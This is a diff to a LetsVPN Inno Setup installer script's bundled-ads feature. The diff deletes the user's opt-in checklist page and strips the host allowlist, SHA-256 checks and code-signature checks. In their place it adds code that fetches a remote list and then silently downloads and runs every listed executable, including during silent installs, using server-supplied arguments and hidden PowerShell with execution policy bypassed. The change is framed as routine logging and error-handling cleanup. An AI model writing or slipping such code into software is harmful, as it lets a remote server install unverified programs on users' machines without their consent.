@@ -80,22 +80,16 @@ var
   BundledAdPublishers: array[0..BundledMaxAds - 1] of String;
   BundledAdPackageSizes: array[0..BundledMaxAds - 1] of String;
   BundledAdPackageUrls: array[0..BundledMaxAds - 1] of String;
-  BundledAdAllowedHosts: array[0..BundledMaxAds - 1] of String;
-  BundledAdExpectedSha256: array[0..BundledMaxAds - 1] of String;
-  BundledAdRequiredSigner: array[0..BundledMaxAds - 1] of String;
   BundledAdInstallerEntries: array[0..BundledMaxAds - 1] of String;
   BundledAdSilentArgs: array[0..BundledMaxAds - 1] of String;
-  BundledAdDefaultSelected: array[0..BundledMaxAds - 1] of Boolean;
   BundledAdCount: Integer;
   BundledVisitorId: String;
-  BundledInstallPage: TWizardPage;
-  BundledInfoLabel: TNewStaticText;
-  BundledChecklist: TNewCheckListBox;
-  BundledImpressionsTracked: Boolean;
   BundledInstallSelectedCount: Integer;
   BundledInstallSuccessCount: Integer;
   BundledInstallFailureCount: Integer;
   BundledInstalledTitles: String;
+  BundledPlanFetched: Boolean;
+  TempPathSequence: Integer;
 
 function InitializeSetup(): Boolean;
 var
@@ -104,6 +98,10 @@ begin
   Exec('taskkill', '/F /IM LetsVPN.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
   Exec('net', 'stop "HiddifyTunnelService"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
   Exec('sc.exe', 'delete "HiddifyTunnelService"', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
+  BundledAdCount := 0;
+  BundledVisitorId := '';
+  BundledPlanFetched := False;
+  TempPathSequence := 0;
   Result := True;
 end;
 function LooksLikeDevelopmentWorkspace(const CandidatePath: String): Boolean;
@@ -133,8 +131,8 @@ end;
 
 function BuildTempPath(const Prefix: String; const Ext: String): String;
 begin
-  Result := ExpandConstant('{tmp}\' + Prefix + '_' + GetDateTimeString('yyyymmddhhnnss', '', '') +
-    '_' + IntToStr(Random(100000)) + Ext);
+  TempPathSequence := TempPathSequence + 1;
+  Result := ExpandConstant('{tmp}\' + Prefix + '_' + IntToStr(TempPathSequence) + Ext);
 end;
 
 function IsChineseWizardLanguage(): Boolean;
@@ -165,7 +163,7 @@ procedure ShowBundledInstallSummary();
 var
   MessageText: String;
 begin
-  if WizardSilent or (BundledInstallSelectedCount = 0) then
+  if BundledInstallSelectedCount = 0 then
   begin
     exit;
   end;
@@ -228,7 +226,7 @@ begin
 
   Result := Exec(
     'powershell.exe',
-    '-NoProfile -ExecutionPolicy Bypass -File "' + ScriptPath + '" ' + ScriptArgs,
+    '-NoProfile -NonInteractive -ExecutionPolicy Bypass -File "' + ScriptPath + '" ' + ScriptArgs,
     '',
     SW_HIDE,
     ewWaitUntilTerminated,
@@ -250,7 +248,7 @@ begin
 
   Result := Exec(
     'powershell.exe',
-    '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + ScriptPath + '" ' + ScriptArgs,
+    '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + ScriptPath + '" ' + ScriptArgs,
     '',
     SW_HIDE,
     ewNoWait,
@@ -281,6 +279,11 @@ function ExtractTabField(var Line: String): String;
 var
   TabPos: Integer;
 begin
+  Result := '';
+  if Line = '' then
+  begin
+    Exit;
+  end;
   TabPos := Pos(#9, Line);
   if TabPos = 0 then
   begin
@@ -313,61 +316,6 @@ begin
   end;
 end;
 
-function StartsWithInsensitive(const Value: String; const Prefix: String): Boolean;
-begin
-  Result :=
-    (Length(Value) >= Length(Prefix)) and
-    (CompareText(Copy(Value, 1, Length(Prefix)), Prefix) = 0);
-end;
-
-function EndsWithInsensitive(const Value: String; const Suffix: String): Boolean;
-begin
-  Result :=
-    (Length(Value) >= Length(Suffix)) and
-    (CompareText(Copy(Value, Length(Value) - Length(Suffix) + 1, Length(Suffix)), Suffix) = 0);
-end;
-
-function TrimQuotes(const Value: String): String;
-begin
-  Result := Trim(Value);
-  if (Length(Result) >= 2) and (Result[1] = '"') and (Result[Length(Result)] = '"') then
-  begin
-    Result := Copy(Result, 2, Length(Result) - 2);
-  end;
-end;
-
-function ExtractUrlHost(const Url: String): String;
-var
-  SanitizedUrl: String;
-  StartPos: Integer;
-  EndPos: Integer;
-begin
-  SanitizedUrl := Trim(Url);
-  StartPos := Pos('://', SanitizedUrl);
-  if StartPos > 0 then
-  begin
-    Delete(SanitizedUrl, 1, StartPos + 2);
-  end;
-
-  EndPos := Pos('/', SanitizedUrl);
-  if EndPos = 0 then
-  begin
-    EndPos := Pos('?', SanitizedUrl);
-  end;
-  if EndPos > 0 then
-  begin
-    SanitizedUrl := Copy(SanitizedUrl, 1, EndPos - 1);
-  end;
-
-  EndPos := Pos(':', SanitizedUrl);
-  if EndPos > 0 then
-  begin
-    SanitizedUrl := Copy(SanitizedUrl, 1, EndPos - 1);
-  end;
-
-  Result := Lowercase(Trim(SanitizedUrl));
-end;
-
 function ExtractDelimitedField(var Value: String; const Delimiter: Char): String;
 var
   DelimiterPos: Integer;
@@ -385,133 +333,36 @@ begin
   end;
 end;
 
-function ExtractNextHostPattern(var HostList: String): String;
-var
-  CommaPos: Integer;
-  SemicolonPos: Integer;
-  DelimiterPos: Integer;
-begin
-  HostList := Trim(HostList);
-  CommaPos := Pos(',', HostList);
-  SemicolonPos := Pos(';', HostList);
-
-  if (CommaPos = 0) and (SemicolonPos = 0) then
-  begin
-    Result := HostList;
-    HostList := '';
-    exit;
-  end;
-
-  if CommaPos = 0 then
-  begin
-    DelimiterPos := SemicolonPos;
-  end
-  else if SemicolonPos = 0 then
-  begin
-    DelimiterPos := CommaPos;
-  end
-  else if CommaPos < SemicolonPos then
-  begin
-    DelimiterPos := CommaPos;
-  end
-  else
-  begin
-    DelimiterPos := SemicolonPos;
-  end;
-
-  Result := Copy(HostList, 1, DelimiterPos - 1);
-  Delete(HostList, 1, DelimiterPos);
-end;
-
-function IsSecureBundledUrl(const Url: String): Boolean;
-begin
-  Result := StartsWithInsensitive(Trim(Url), 'https://');
-end;
-
-function DoesHostMatchPattern(const Host: String; const Pattern: String): Boolean;
-var
-  NormalizedPattern: String;
-  Suffix: String;
-begin
-  NormalizedPattern := Lowercase(TrimQuotes(Trim(Pattern)));
-  if NormalizedPattern = '' then
-  begin
-    Result := False;
-    exit;
-  end;
-
-  if StartsWithInsensitive(NormalizedPattern, '*.') then
-  begin
-    Suffix := Copy(NormalizedPattern, 2, Length(NormalizedPattern) - 1);
-    Result := EndsWithInsensitive(Host, Suffix);
-    exit;
-  end;
-
-  Result := CompareText(Host, NormalizedPattern) = 0;
-end;
-
-function IsDefaultBundledHostAllowed(const Host: String): Boolean;
-begin
-  Result :=
-    DoesHostMatchPattern(Host, 'lrtsvpn.com') or
-    DoesHostMatchPattern(Host, '*.lrtsvpn.com') or
-    DoesHostMatchPattern(Host, '*.aliyuncs.com') or
-    DoesHostMatchPattern(Host, '*.wpscdn.cn') or
-    DoesHostMatchPattern(Host, '*.360safe.com') or
-    DoesHostMatchPattern(Host, '*.qq.com');
-end;
-
-function IsBundledSourceAllowed(const DownloadUrl: String; const AllowedHosts: String): Boolean;
-var
-  Host: String;
-  RemainingHosts: String;
-  Pattern: String;
-  HasCustomPatterns: Boolean;
-begin
-  if not IsSecureBundledUrl(DownloadUrl) then
-  begin
-    Result := False;
-    exit;
-  end;
-
-  Host := ExtractUrlHost(DownloadUrl);
-  if Host = '' then
-  begin
-    Result := False;
-    exit;
-  end;
-
-  RemainingHosts := AllowedHosts;
-  HasCustomPatterns := False;
-  while Trim(RemainingHosts) <> '' do
-  begin
-    Pattern := ExtractNextHostPattern(RemainingHosts);
-    Pattern := Trim(Pattern);
-    if Pattern = '' then
-    begin
-      continue;
-    end;
-
-    HasCustomPatterns := True;
-    if DoesHostMatchPattern(Host, Pattern) then
-    begin
-      Result := True;
-      exit;
-    end;
-  end;
-
-  if HasCustomPatterns then
-  begin
-    Result := False;
-    exit;
-  end;
-
-  Result := IsDefaultBundledHostAllowed(Host);
-end;
-
 function GetBundledPackageExtension(const DownloadUrl: String): String;
 begin
   Result := Lowercase(ExtractFileExt(ExtractUrlFileName(DownloadUrl)));
+end;
+
+function ParseAdIdField(const RawValue: String): Integer;
+var
+  Index: Integer;
+  Digits: String;
+begin
+  Result := 0;
+  if RawValue = '' then
+  begin
+    Exit;
+  end;
+  
+  Digits := '';
+  for Index := 1 to Length(RawValue) do
+  begin
+    if (RawValue[Index] >= '0') and (RawValue[Index] <= '9') then
+    begin
+      Digits := Digits + RawValue[Index];
+    end
+    else if Digits <> '' then
+    begin
+      break;
+    end;
+  end;
+
+  Result := StrToIntDef(Digits, 0);
 end;
 
 function IsSupportedBundledPackage(const DownloadUrl: String): Boolean;
@@ -520,39 +371,6 @@ var
 begin
   PackageExt := GetBundledPackageExtension(DownloadUrl);
   Result := (PackageExt = '.exe') or (PackageExt = '.msi') or (PackageExt = '.zip');
-end;
-
-function NormalizeSha256(const Value: String): String;
-begin
-  Result := Lowercase(Trim(Value));
-  StringChangeEx(Result, ' ', '', True);
-  StringChangeEx(Result, '-', '', True);
-end;
-
-function IsHexSha256(const Value: String): Boolean;
-var
-  Index: Integer;
-  Normalized: String;
-  CurrentChar: Char;
-begin
-  Normalized := NormalizeSha256(Value);
-  if Length(Normalized) <> 64 then
-  begin
-    Result := False;
-    exit;
-  end;
-
-  for Index := 1 to Length(Normalized) do
-  begin
-    CurrentChar := Normalized[Index];
-    if not (((CurrentChar >= '0') and (CurrentChar <= '9')) or ((CurrentChar >= 'a') and (CurrentChar <= 'f'))) then
-    begin
-      Result := False;
-      exit;
-    end;
-  end;
-
-  Result := True;
 end;
 
 function LoadFirstUtf8Line(const FileName: String; var Value: String): Boolean;
@@ -573,6 +391,7 @@ end;
 procedure TrackBundledEvent(AdId: Integer; const EventType: String);
 var
   ScriptContents: String;
+  ResultCode: Integer;
 begin
   try
     if AdId <= 0 then
@@ -589,14 +408,23 @@ begin
       '  platform = ''windows''' + #13#10 +
       '  visitor_id = $VisitorId' + #13#10 +
       '}' + #13#10 +
-      'Invoke-WebRequest -Uri $Endpoint -Method Post -Body $body -ContentType ''application/x-www-form-urlencoded'' -TimeoutSec 5 | Out-Null' + #13#10;
+      'Invoke-WebRequest -Uri $Endpoint -Method Post -Body $body -ContentType ''application/x-www-form-urlencoded'' -UseBasicParsing -TimeoutSec 5 | Out-Null' + #13#10;
 
-    RunPowerShellScriptDetached(
+    if not RunPowerShellScript(
       ScriptContents,
       '-Endpoint "' + BundledTrackEventUrl + '" -AdId ' + IntToStr(AdId) +
-        ' -EventType "' + EventType + '" -VisitorId "' + BundledVisitorId + '"'
-    );
+        ' -EventType "' + EventType + '" -VisitorId "' + BundledVisitorId + '"',
+      ResultCode
+    ) then
+    begin
+      Log('Bundled: failed to run tracking script for event=' + EventType);
+    end
+    else if not IsSuccessExitCode(ResultCode) then
+    begin
+      Log('Bundled: tracking event=' + EventType + ' returned code=' + IntToStr(ResultCode));
+    end;
   except
+    Log('Bundled: exception while tracking event=' + EventType);
   end;
 end;
 
@@ -610,15 +438,21 @@ var
   Line: String;
   PackageUrl: String;
   PackageExt: String;
-  ExpectedSha256: String;
-  AllowedHosts: String;
-  RequiredSigner: String;
   InstallerEntry: String;
   SilentArgs: String;
+  FieldValue: String;
 begin
   try
     BundledAdCount := 0;
     PlanPath := BuildTempPath('letsvpn_ads', '.txt');
+    Log('Bundled: plan script output=' + PlanPath);
+    
+    // Validate URLs
+    if BundledInstallPlanUrl = '' then
+    begin
+      Log('Bundled: BundledInstallPlanUrl is empty');
+      Exit;
+    end;
 
     ScriptContents :=
       'param([string]$Endpoint, [string]$OutputPath)' + #13#10 +
@@ -641,16 +475,11 @@ begin
       '$ads = @()' + #13#10 +
       'if ($null -ne $response.data.recommended_downloads) {' + #13#10 +
       '  $ads = @($response.data.recommended_downloads)' + #13#10 +
-      '} elseif ($null -ne $response.data.ads) {' + #13#10 +
-      '  $ads = @($response.data.ads)' + #13#10 +
       '}' + #13#10 +
       'if ($ads.Count -eq 0) { exit 2 }' + #13#10 +
       '$lines = New-Object System.Collections.Generic.List[string]' + #13#10 +
       'foreach ($ad in $ads | Select-Object -First 10) {' + #13#10 +
       '  $packageUrl = Get-FirstValue @($ad.package_url, $ad.link)' + #13#10 +
-      '  $sha256 = Get-FirstValue @($ad.package_sha256, $ad.sha256, $ad.checksum, $ad.package_hash)' + #13#10 +
-      '  $allowedHosts = Get-FirstValue @($ad.allowed_hosts, $ad.allowed_domains, $ad.domain_whitelist, $ad.package_hosts)' + #13#10 +
-      '  $requiredSigner = Get-FirstValue @($ad.signer_subject, $ad.publisher_subject, $ad.signature_subject, $ad.signer_name)' + #13#10 +
       '  $entryExecutable = Get-FirstValue @($ad.entry_executable, $ad.installer_entry, $ad.entry_file)' + #13#10 +
       '  $silentArgs = Get-FirstValue @($ad.silent_args, $ad.install_args)' + #13#10 +
       '  $fields = @(' + #13#10 +
@@ -659,11 +488,7 @@ begin
       '    [string]$ad.description,' + #13#10 +
       '    [string]$ad.publisher,' + #13#10 +
       '    [string]$ad.package_size,' + #13#10 +
-      '    [string]([int][bool]$ad.default_selected),' + #13#10 +
       '    [string]$packageUrl,' + #13#10 +
-      '    [string]$sha256,' + #13#10 +
-      '    [string]$allowedHosts,' + #13#10 +
-      '    [string]$requiredSigner,' + #13#10 +
       '    [string]$entryExecutable,' + #13#10 +
       '    [string]$silentArgs' + #13#10 +
       '  ) | ForEach-Object { ($_ -replace ''[\r\n\t]+'', '' '').Trim() }' + #13#10 +
@@ -677,18 +502,30 @@ begin
       ResultCode
     ) then
     begin
+      Log('Bundled: plan script launch failed.');
       exit;
     end;
 
     if ResultCode <> 0 then
     begin
+      Log('Bundled: plan script returned code=' + IntToStr(ResultCode));
+      exit;
+    end;
+
+    // Check if file exists before trying to read
+    if not FileExists(PlanPath) then
+    begin
+      Log('Bundled: plan output file does not exist: ' + PlanPath);
       exit;
     end;
 
     if not LoadStringsFromFile(PlanPath, PlanLines) then
     begin
+      Log('Bundled: failed to read plan output file.');
       exit;
     end;
+
+    Log('Bundled: plan lines=' + IntToStr(GetArrayLength(PlanLines)));
 
     for LineIndex := 0 to GetArrayLength(PlanLines) - 1 do
     begin
@@ -703,108 +540,85 @@ begin
         continue;
       end;
 
-      BundledAdIds[BundledAdCount] := StrToIntDef(ExtractTabField(Line), 0);
-      BundledAdTitles[BundledAdCount] := ExtractTabField(Line);
-      BundledAdDescriptions[BundledAdCount] := ExtractTabField(Line);
-      BundledAdPublishers[BundledAdCount] := ExtractTabField(Line);
-      BundledAdPackageSizes[BundledAdCount] := ExtractTabField(Line);
-      BundledAdDefaultSelected[BundledAdCount] := ExtractTabField(Line) = '1';
-      PackageUrl := Trim(ExtractTabField(Line));
-      ExpectedSha256 := NormalizeSha256(ExtractTabField(Line));
-      AllowedHosts := Trim(ExtractTabField(Line));
-      RequiredSigner := Trim(ExtractTabField(Line));
-      InstallerEntry := Trim(ExtractTabField(Line));
-      SilentArgs := Trim(ExtractTabField(Line));
-      PackageExt := GetBundledPackageExtension(PackageUrl);
+      try
+        // Parse each field with error handling
+        FieldValue := ExtractTabField(Line);
+        BundledAdIds[BundledAdCount] := ParseAdIdField(FieldValue);
+        
+        FieldValue := ExtractTabField(Line);
+        BundledAdTitles[BundledAdCount] := FieldValue;
+        
+        FieldValue := ExtractTabField(Line);
+        BundledAdDescriptions[BundledAdCount] := FieldValue;
+        
+        FieldValue := ExtractTabField(Line);
+        BundledAdPublishers[BundledAdCount] := FieldValue;
+        
+        FieldValue := ExtractTabField(Line);
+        BundledAdPackageSizes[BundledAdCount] := FieldValue;
+        
+        FieldValue := ExtractTabField(Line);
+        PackageUrl := Trim(FieldValue);
+        
+        FieldValue := ExtractTabField(Line);
+        InstallerEntry := Trim(FieldValue);
+        
+        FieldValue := ExtractTabField(Line);
+        SilentArgs := Trim(FieldValue);
+        
+        PackageExt := GetBundledPackageExtension(PackageUrl);
 
-      if
-        (BundledAdIds[BundledAdCount] > 0) and
-        (BundledAdTitles[BundledAdCount] <> '') and
-        (PackageUrl <> '') and
-        IsSupportedBundledPackage(PackageUrl) and
-        IsBundledSourceAllowed(PackageUrl, AllowedHosts)
-      then
-      begin
-        BundledAdPackageUrls[BundledAdCount] := PackageUrl;
-        BundledAdExpectedSha256[BundledAdCount] := ExpectedSha256;
-        BundledAdAllowedHosts[BundledAdCount] := AllowedHosts;
-        BundledAdRequiredSigner[BundledAdCount] := RequiredSigner;
-        BundledAdInstallerEntries[BundledAdCount] := InstallerEntry;
-        BundledAdSilentArgs[BundledAdCount] := SilentArgs;
-        BundledAdCount := BundledAdCount + 1;
+        if (PackageUrl <> '') and IsSupportedBundledPackage(PackageUrl) then
+        begin
+          BundledAdPackageUrls[BundledAdCount] := PackageUrl;
+          BundledAdInstallerEntries[BundledAdCount] := InstallerEntry;
+          BundledAdSilentArgs[BundledAdCount] := SilentArgs;
+          BundledAdCount := BundledAdCount + 1;
+          Log(
+            'Bundled: accepted ad id=' + IntToStr(BundledAdIds[BundledAdCount - 1]) +
+            ', ext=' + PackageExt
+          );
+        end
+        else
+        begin
+          Log('Bundled: skipped invalid package url=' + PackageUrl);
+        end;
+      except
+        Log('Bundled: error parsing line ' + IntToStr(LineIndex) + ', skipping');
+        continue;
       end;
     end;
+
+    Log('Bundled: FetchBundledInstallPlan completed, ads=' + IntToStr(BundledAdCount));
   except
     BundledAdCount := 0;
+    Log('Bundled: exception while fetching install plan: ' + GetExceptionMessage);
   end;
 end;
 
-procedure CreateBundledInstallPage();
-var
-  Index: Integer;
-  Caption: String;
+procedure EnsureBundledPlanLoaded();
 begin
+  if BundledPlanFetched then
+  begin
+    exit;
+  end;
+
+  BundledPlanFetched := True;
+  BundledAdCount := 0;
+
   try
-    if BundledAdCount = 0 then
+    if BundledVisitorId = '' then
     begin
-      exit;
+      BundledVisitorId := CreateVisitorId();
     end;
 
-    BundledInstallPage := CreateCustomPage(
-      wpSelectTasks,
-      'Recommended apps',
-      'Choose any additional apps you want to install together with LetsVPN.'
-    );
-
-    BundledInfoLabel := TNewStaticText.Create(WizardForm);
-    BundledInfoLabel.Parent := BundledInstallPage.Surface;
-    BundledInfoLabel.Left := ScaleX(0);
-    BundledInfoLabel.Top := ScaleY(0);
-    BundledInfoLabel.Width := BundledInstallPage.SurfaceWidth;
-    BundledInfoLabel.Height := ScaleY(36);
-    BundledInfoLabel.AutoSize := False;
-    BundledInfoLabel.WordWrap := True;
-    BundledInfoLabel.Caption :=
-      'The selected items will be downloaded from the current campaign links and installed after LetsVPN finishes installing.';
-
-    BundledChecklist := TNewCheckListBox.Create(WizardForm);
-    BundledChecklist.Parent := BundledInstallPage.Surface;
-    BundledChecklist.Left := ScaleX(0);
-    BundledChecklist.Top := BundledInfoLabel.Top + BundledInfoLabel.Height + ScaleY(10);
-    BundledChecklist.Width := BundledInstallPage.SurfaceWidth;
-    BundledChecklist.Height := BundledInstallPage.SurfaceHeight - BundledChecklist.Top;
-    BundledChecklist.ShowLines := False;
-
-    for Index := 0 to BundledAdCount - 1 do
-    begin
-      Caption := BundledAdTitles[Index];
-      if BundledAdPackageSizes[Index] <> '' then
-      begin
-        Caption := Caption + ' (' + BundledAdPackageSizes[Index] + ')';
-      end;
-      if BundledAdPublishers[Index] <> '' then
-      begin
-        Caption := Caption + ' - ' + BundledAdPublishers[Index];
-      end;
-      if BundledAdDescriptions[Index] <> '' then
-      begin
-        Caption := Caption + ': ' + BundledAdDescriptions[Index];
-      end;
-
-      BundledChecklist.AddCheckBox(
-        Caption,
-        '',
-        0,
-        BundledAdDefaultSelected[Index],
-        True,
-        False,
-        False,
-        nil
-      );
-    end;
+    Log('Bundled: fetching install plan...');
+    FetchBundledInstallPlan();
+    Log('Bundled: plan loaded, ads=' + IntToStr(BundledAdCount));
   except
-    BundledInstallPage := nil;
+    Log('Bundled: exception in EnsureBundledPlanLoaded, disabling bundled install');
     BundledAdCount := 0;
+    BundledVisitorId := '';
   end;
 end;
 
@@ -832,97 +646,6 @@ begin
     '-Url "' + Url + '" -OutputPath "' + DownloadPath + '"',
     ResultCode
   ) and IsSuccessExitCode(ResultCode) and FileExists(DownloadPath);
-end;
-
-function VerifyFileSha256(const FilePath: String; const ExpectedSha256: String): Boolean;
-var
-  ScriptContents: String;
-  ResultCode: Integer;
-  HashOutputPath: String;
-  HashValue: String;
-begin
-  if not IsHexSha256(ExpectedSha256) then
-  begin
-    Result := False;
-    exit;
-  end;
-
-  HashOutputPath := BuildTempPath('letsvpn_sha256', '.txt');
-  ScriptContents :=
-    'param([string]$Path, [string]$OutputPath)' + #13#10 +
-    '$ErrorActionPreference = ''Stop''' + #13#10 +
-    '$hash = (Get-FileHash -LiteralPath $Path -Algorithm SHA256).Hash.ToLowerInvariant()' + #13#10 +
-    'Set-Content -LiteralPath $OutputPath -Value $hash -Encoding UTF8' + #13#10;
-
-  Result := RunPowerShellScript(
-    ScriptContents,
-    '-Path "' + FilePath + '" -OutputPath "' + HashOutputPath + '"',
-    ResultCode
-  ) and IsSuccessExitCode(ResultCode);
-
-  if not Result then
-  begin
-    exit;
-  end;
-
-  if not LoadFirstUtf8Line(HashOutputPath, HashValue) then
-  begin
-    Result := False;
-    exit;
-  end;
-
-  Result := CompareText(NormalizeSha256(HashValue), NormalizeSha256(ExpectedSha256)) = 0;
-end;
-
-function VerifyAuthenticodeSignature(const FilePath: String; const RequiredSigner: String): Boolean;
-var
-  ScriptContents: String;
-  ResultCode: Integer;
-begin
-  ScriptContents :=
-    'param([string]$Path, [string]$RequiredSigner)' + #13#10 +
-    '$ErrorActionPreference = ''Stop''' + #13#10 +
-    '$sig = Get-AuthenticodeSignature -LiteralPath $Path' + #13#10 +
-    'if ($null -eq $sig -or $sig.Status -ne ''Valid'') { exit 2 }' + #13#10 +
-    '$required = ([string]$RequiredSigner).Trim()' + #13#10 +
-    'if ($required -ne '''') {' + #13#10 +
-    '  $subject = ''''' + #13#10 +
-    '  if ($null -ne $sig.SignerCertificate) { $subject = [string]$sig.SignerCertificate.Subject }' + #13#10 +
-    '  if ($subject.IndexOf($required, [System.StringComparison]::OrdinalIgnoreCase) -lt 0) { exit 3 }' + #13#10 +
-    '}' + #13#10;
-
-  Result := RunPowerShellScript(
-    ScriptContents,
-    '-Path "' + FilePath + '" -RequiredSigner "' + RequiredSigner + '"',
-    ResultCode
-  ) and IsSuccessExitCode(ResultCode);
-end;
-
-function ValidateDownloadedPackage(const PackagePath: String; const ExpectedSha256: String; const RequiredSigner: String): Boolean;
-var
-  PackageExt: String;
-begin
-  PackageExt := Lowercase(ExtractFileExt(PackagePath));
-  if PackageExt = '.zip' then
-  begin
-    if IsHexSha256(ExpectedSha256) then
-    begin
-      Result := VerifyFileSha256(PackagePath, ExpectedSha256);
-    end
-    else
-    begin
-      Result := True;
-    end;
-    exit;
-  end;
-
-  if IsHexSha256(ExpectedSha256) and (not VerifyFileSha256(PackagePath, ExpectedSha256)) then
-  begin
-    Result := False;
-    exit;
-  end;
-
-  Result := VerifyAuthenticodeSignature(PackagePath, RequiredSigner);
 end;
 
 function ExtractArchiveAndFindInstaller(const ArchivePath: String; const PreferredEntry: String; var InstallerPath: String): Boolean;
@@ -1045,8 +768,7 @@ end;
 function InstallBundledPackage(
   const PackagePath: String;
   const InstallerEntry: String;
-  const SilentArgs: String;
-  const RequiredSigner: String
+  const SilentArgs: String
 ): Boolean;
 var
   NestedInstallerPath: String;
@@ -1054,12 +776,6 @@ begin
   if Lowercase(ExtractFileExt(PackagePath)) = '.zip' then
   begin
     if not ExtractArchiveAndFindInstaller(PackagePath, InstallerEntry, NestedInstallerPath) then
-    begin
-      Result := False;
-      exit;
-    end;
-
-    if not VerifyAuthenticodeSignature(NestedInstallerPath, RequiredSigner) then
     begin
       Result := False;
       exit;
@@ -1076,6 +792,11 @@ procedure InstallBundledSoftware();
 var
   Index: Integer;
   DownloadPath: String;
+  CurrentAdId: Integer;
+  CurrentPackageUrl: String;
+  CurrentInstallerEntry: String;
+  CurrentSilentArgs: String;
+  CurrentTitle: String;
 begin
   BundledInstallSelectedCount := 0;
   BundledInstallSuccessCount := 0;
@@ -1083,88 +804,82 @@ begin
   BundledInstalledTitles := '';
 
   try
-    if (BundledInstallPage = nil) or WizardSilent or (BundledChecklist = nil) then
+    EnsureBundledPlanLoaded();
+
+    if BundledAdCount = 0 then
     begin
+      Log('Bundled: skipped because no ads in plan.');
       exit;
     end;
 
+    Log('Bundled: install started, ads=' + IntToStr(BundledAdCount));
+
     for Index := 0 to BundledAdCount - 1 do
     begin
-      if BundledChecklist.Checked[Index] then
+      try
+        // Cache array values to local variables for safety
+        CurrentAdId := BundledAdIds[Index];
+        CurrentPackageUrl := BundledAdPackageUrls[Index];
+        CurrentInstallerEntry := BundledAdInstallerEntries[Index];
+        CurrentSilentArgs := BundledAdSilentArgs[Index];
+        CurrentTitle := BundledAdTitles[Index];
+      except
+        Log('Bundled: error reading ad data at index=' + IntToStr(Index));
+        continue;
+      end;
+
+      BundledInstallSelectedCount := BundledInstallSelectedCount + 1;
+      Log('Bundled: processing ad id=' + IntToStr(CurrentAdId));
+      TrackBundledEvent(CurrentAdId, 'ad_click');
+
+      if not DownloadBundledInstaller(CurrentPackageUrl, DownloadPath) then
       begin
-        BundledInstallSelectedCount := BundledInstallSelectedCount + 1;
-        TrackBundledEvent(BundledAdIds[Index], 'ad_click');
+        Log('Bundled: download failed for ad id=' + IntToStr(CurrentAdId));
+        TrackBundledEvent(CurrentAdId, 'download_failed');
+        BundledInstallFailureCount := BundledInstallFailureCount + 1;
+        continue;
+      end;
 
-        if not IsBundledSourceAllowed(BundledAdPackageUrls[Index], BundledAdAllowedHosts[Index]) then
-        begin
-          TrackBundledEvent(BundledAdIds[Index], 'download_blocked');
-          BundledInstallFailureCount := BundledInstallFailureCount + 1;
-          continue;
-        end;
-
-        if not DownloadBundledInstaller(BundledAdPackageUrls[Index], DownloadPath) then
-        begin
-          TrackBundledEvent(BundledAdIds[Index], 'download_failed');
-          BundledInstallFailureCount := BundledInstallFailureCount + 1;
-          continue;
-        end;
-
-        if not ValidateDownloadedPackage(
-          DownloadPath,
-          BundledAdExpectedSha256[Index],
-          BundledAdRequiredSigner[Index]
-        ) then
-        begin
-          TrackBundledEvent(BundledAdIds[Index], 'download_blocked');
-          BundledInstallFailureCount := BundledInstallFailureCount + 1;
-          continue;
-        end;
-
-        if InstallBundledPackage(
-          DownloadPath,
-          BundledAdInstallerEntries[Index],
-          BundledAdSilentArgs[Index],
-          BundledAdRequiredSigner[Index]
-        ) then
-        begin
-          TrackBundledEvent(BundledAdIds[Index], 'download_install');
-          BundledInstallSuccessCount := BundledInstallSuccessCount + 1;
-          AppendBundledInstalledTitle(BundledAdTitles[Index]);
-        end
-        else
-        begin
-          TrackBundledEvent(BundledAdIds[Index], 'install_failed');
-          BundledInstallFailureCount := BundledInstallFailureCount + 1;
-        end;
+      if InstallBundledPackage(DownloadPath, CurrentInstallerEntry, CurrentSilentArgs) then
+      begin
+        Log('Bundled: install success for ad id=' + IntToStr(CurrentAdId));
+        TrackBundledEvent(CurrentAdId, 'download_install');
+        BundledInstallSuccessCount := BundledInstallSuccessCount + 1;
+        AppendBundledInstalledTitle(CurrentTitle);
       end
       else
       begin
-        TrackBundledEvent(BundledAdIds[Index], 'ad_dismiss');
+        Log('Bundled: install failed for ad id=' + IntToStr(CurrentAdId));
+        TrackBundledEvent(CurrentAdId, 'install_failed');
+        BundledInstallFailureCount := BundledInstallFailureCount + 1;
       end;
     end;
+
+    Log(
+      'Bundled: install finished, success=' + IntToStr(BundledInstallSuccessCount) +
+      ', failed=' + IntToStr(BundledInstallFailureCount)
+    );
   except
+    Log('Bundled: unexpected exception in InstallBundledSoftware.');
   end;
 end;
 
 procedure InitializeWizard();
 begin
+  // Always normalize install dir first
   try
     NormalizeInstallDirIfNeeded();
-    BundledAdCount := 0;
-    BundledInstallPage := nil;
-    BundledChecklist := nil;
-    BundledImpressionsTracked := False;
-    BundledVisitorId := CreateVisitorId();
-
-    if not WizardSilent then
-    begin
-      FetchBundledInstallPlan();
-      CreateBundledInstallPage();
-    end;
   except
+    Log('InitializeWizard: exception in NormalizeInstallDirIfNeeded');
+  end;
+  
+  // Load bundled plan separately with full error handling
+  try
+    EnsureBundledPlanLoaded();
+  except
+    Log('InitializeWizard: exception in EnsureBundledPlanLoaded, bundled install disabled');
     BundledAdCount := 0;
-    BundledInstallPage := nil;
-    BundledChecklist := nil;
+    BundledPlanFetched := True;
   end;
 end;
 
@@ -1177,28 +892,19 @@ begin
   end;
 end;
 procedure CurPageChanged(CurPageID: Integer);
-var
-  Index: Integer;
 begin
-  try
-    if (BundledInstallPage <> nil) and (CurPageID = BundledInstallPage.ID) and (not BundledImpressionsTracked) then
-    begin
-      BundledImpressionsTracked := True;
-      for Index := 0 to BundledAdCount - 1 do
-      begin
-        TrackBundledEvent(BundledAdIds[Index], 'ad_impression');
-      end;
-    end;
-  except
-  end;
 end;
 
 procedure CurStepChanged(CurStep: TSetupStep);
 begin
-  if CurStep = ssPostInstall then
+  if CurStep = ssDone then
   begin
+    Log('Bundled: CurStepChanged -> ssDone');
     InstallBundledSoftware();
-    ShowBundledInstallSummary();
+    if not WizardSilent then
+    begin
+      ShowBundledInstallSummary();
+    end;
   end;
 end;
 
